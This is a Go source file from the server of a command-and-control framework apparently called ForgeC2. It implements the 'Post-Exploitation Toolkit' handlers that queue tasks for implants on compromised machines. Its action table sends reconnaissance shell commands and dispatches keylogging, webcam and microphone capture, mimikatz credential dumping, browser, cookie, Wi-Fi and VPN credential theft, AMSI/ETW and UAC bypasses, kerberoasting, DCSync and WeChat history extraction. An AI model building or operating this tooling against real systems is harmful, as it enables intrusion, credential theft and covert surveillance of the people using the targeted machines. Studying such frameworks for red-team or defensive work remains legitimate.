package server

import (
	"fmt"
	"log/slog"
	"net/http"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleToolkitPage(c *gin.Context) {
	stats := s.getNavStats(c)

	var agents []db.Implant
	if err := s.db.Order("last_seen desc").Limit(50).Find(&agents).Error; err != nil {
		slog.Error("Toolkit: failed to query agents", "err", err)
	}
	for i := range agents {
		agents[i].Status = s.agentStatus(agents[i]).Status
	}

	var recentTasks []db.Task
	if err := s.db.Where("status IN ('completed','failed')").
		Order("created_at desc").Limit(20).Find(&recentTasks).Error; err != nil {
		slog.Error("Toolkit: failed to query recent tasks", "err", err)
	}

	var agentTasks []db.Task
	if err := s.db.Where("agent_id = ? AND status IN ('completed','failed')", "").
		Order("created_at desc").Limit(10).Find(&agentTasks).Error; err != nil {
		slog.Error("Toolkit: failed to query agent tasks", "err", err)
	}

	data := gin.H{
		"Title":       "ForgeC2 - Post-Exploitation Toolkit",
		"ActiveNav":   "toolkit",
		"Stats":       stats,
		"Agents":      agents,
		"RecentTasks": recentTasks,
	}
	s.renderPageOrJSON(c, data)
}

func (s *Server) handleToolkitQuickAction(c *gin.Context) {
	agentID := c.Param("id")
	var req struct {
		Action string `json:"action" form:"action"`
		Param  string `json:"param" form:"param"`
		Shell  string `json:"shell" form:"shell"`
	}
	_ = c.ShouldBind(&req)
	action := req.Action
	if action == "" {
		action = c.PostForm("action")
	}
	param := req.Param
	if param == "" {
		param = c.PostForm("param")
	}
	shell := req.Shell
	if shell == "" {
		shell = c.PostForm("shell")
	}

	taskType, command := buildQuickActionCommand(action, param, shell)

	spec := TaskSpec{Type: taskType, Command: command, Shell: shell}
	if taskType == "usb_drop" {
		spec.Path = command
		spec.Command = ""
	}
	if taskType == "mimikatz" {
		// Match handleMimikatz: default the command and auto-attach the staged
		// module so the implant does not need a local script.
		if spec.Command == "" {
			spec.Command = "sekurlsa::logonpasswords"
		}
		spec.Data = s.loadMimikatzModuleB64()
	}

	// issueAgentTask, not a bare insert: it applies the tenant scope
	// (getAgentOrFail) and the collaboration-lock gate (createTask). The direct
	// s.db.Create this replaced let an operator queue work on another tenant's
	// agent and silently overwrite an agent another operator was holding.
	task := s.issueAgentTask(c, agentID, spec)
	if task == nil {
		return
	}

	s.LogAuditRecord(c, "toolkit_action",
		fmt.Sprintf("Toolkit action %s sent to agent %s (task #%d)", action, agentID, task.ID),
		agentID, fmt.Sprintf("Action: %s, Param: %s", action, param),
		true, nil)

	s.broadcastTaskUpdate(agentID, *task)

	respond(c, gin.H{
		"task_id": task.ID,
		"message": fmt.Sprintf("Action %s dispatched to agent", action),
	})
}

func buildQuickActionCommand(action, param, shell string) (string, string) {
	switch action {
	case "whoami":
		return "shell", "whoami"
	case "hostname":
		return "shell", "hostname"
	case "ipconfig":
		return "shell", "ipconfig /all"
	case "systeminfo":
		return "shell", "systeminfo"
	case "netstat":
		return "shell", "netstat -ano"
	case "netusers":
		return "shell", "net user"
	case "netlocalgroup":
		return "shell", "net localgroup administrators"
	case "tasklist":
		return "shell", "tasklist /v"
	case "ps":
		return "ps", ""
	case "window_list":
		return "window_list", ""
	case "window_close":
		return "window_close", param
	case "screenshot":
		return "screenshot", ""
	case "av":
		return "shell", `wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState /format:csv 2>nul`
	case "whoami_priv":
		return "shell", "whoami /priv"
	case "whoami_groups":
		return "shell", "whoami /groups"
	case "arp":
		return "shell", "arp -a"
	case "route":
		return "shell", "route print"
	case "netstat_an":
		return "shell", "netstat -an"
	case "netstat_b":
		return "shell", "netstat -b"
	case "schtasks":
		return "shell", "schtasks /query /fo LIST /v"
	case "services":
		return "shell", "sc query type= service state= all"
	case "drivers":
		return "shell", "fltmc instances"
	case "env":
		return "shell", "set"
	case "uptime":
		return "shell", "net statistics workstation"
	case "powershell":
		if param != "" {
			return "powerpick", param
		}
		return "shell", "whoami"
	case "shell":
		if param != "" {
			return "shell", param
		}
		return "shell", "whoami"
	case "keylogger_start":
		return "keylogger_start", ""
	case "keylogger_stop":
		return "keylogger_stop", ""
	case "keylogger_dump":
		return "keylogger_dump", ""
	case "clipboard_get":
		return "clipboard_get", ""
	case "clipboard_set":
		return "clipboard_set", param
	case "webcam":
		return "webcam", param
	case "mic":
		return "mic", param
	case "beacon_now":
		return "beacon_now", ""
	case "elevate":
		return "elevate", ""
	case "uac_bypass":
		return "uac_bypass", ""
	case "amsi_bypass":
		return "amsi_bypass", ""
	case "etw_bypass":
		return "etw_bypass", ""
	case "amsi_hardware_bp":
		return "amsi_hardware_bp", ""
	case "etw_hardware_bp":
		return "etw_hardware_bp", ""
	case "sandbox_detect_advanced":
		return "sandbox_detect_advanced", ""
	case "set_sleep_mask_advanced":
		return "set_sleep_mask_advanced", ""
	case "mimikatz":
		return "mimikatz", ""
	case "creds":
		return "creds_dump", ""
	case "browser_steal":
		return "browser_steal", ""
	case "cookie_export":
		return "cookie_export", "all"
	case "sccm_recon":
		return "sccm_recon", ""
	case "entra_prt":
		return "entra_prt", ""
	case "tun_start":
		return "tun_start", param
	case "tun_stop":
		return "tun_stop", ""
	case "vpn_creds":
		return "vpn_creds", ""
	case "wifi_creds":
		return "wifi_creds", ""
	case "kerberoast":
		return "kerberoast", ""
	case "dcsync":
		return "dcsync", param
	case "privesc_check":
		return "privesc_check", "all"
	case "file_hunt":
		return "file_hunt", param
	case "screen_trigger_start":
		return "screen_trigger_start", param
	case "screen_trigger_stop":
		return "screen_trigger_stop", ""
	case "usb_enum":
		return "usb_enum", ""
	case "usb_drop":
		return "usb_drop", param
	case "browser_history":
		if param == "" {
			param = "all"
		}
		return "browser_history", param
	case "wechat_history":
		if param == "" {
			param = "all"
		}
		return "wechat_history", param
	case "session_recon":
		return "session_recon", ""
	default:
		return "shell", action
	}
}

func (s *Server) handleToolkitRecentResults(c *gin.Context) {
	var tasks []db.Task
	if err := s.db.Where("status IN ('completed','failed')").
		Order("created_at desc").Limit(50).Find(&tasks).Error; err != nil {
		slog.Error("Toolkit: failed to query recent results", "err", err)
	}

	respond(c, gin.H{"tasks": tasks})
}

func (s *Server) handleToolkitAgentInfo(c *gin.Context) {
	agentID := c.Param("id")

	var agent db.Implant
	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err != nil {
		respondError(c, http.StatusNotFound, "agent not found")
		return
	}

	var completedCount, failedCount int64
	if err := s.db.Model(&db.Task{}).Where("agent_id = ? AND status = 'completed'", agentID).Count(&completedCount).Error; err != nil {
		slog.Error("Failed to count completed tasks", "agent_id", agentID, "err", err)
	}
	if err := s.db.Model(&db.Task{}).Where("agent_id = ? AND status = 'failed'", agentID).Count(&failedCount).Error; err != nil {
		slog.Error("Failed to count failed tasks", "agent_id", agentID, "err", err)
	}
	terminal := completedCount + failedCount
	var successRateStr string
	if terminal == 0 {
		successRateStr = "N/A"
	} else {
		successRateStr = fmt.Sprintf("%.1f", float64(completedCount)/float64(terminal)*100)
	}
	var taskCount int64
	if err := s.db.Model(&db.Task{}).Where("agent_id = ?", agentID).Count(&taskCount).Error; err != nil {
		slog.Error("Failed to count agent tasks", "agent_id", agentID, "err", err)
	}

	respond(c, gin.H{
		"agent":        agent,
		"task_count":   taskCount,
		"success_rate": successRateStr,
	})
}

func (s *Server) handleToolkitAgentTasks(c *gin.Context) {
	agentID := c.Param("id")

	var tasks []db.Task
	if err := s.db.Where("agent_id = ?", agentID).
		Order("created_at desc").Limit(30).Find(&tasks).Error; err != nil {
		slog.Error("Toolkit: failed to query agent tasks", "err", err)
	}

	respond(c, gin.H{"tasks": tasks})
}
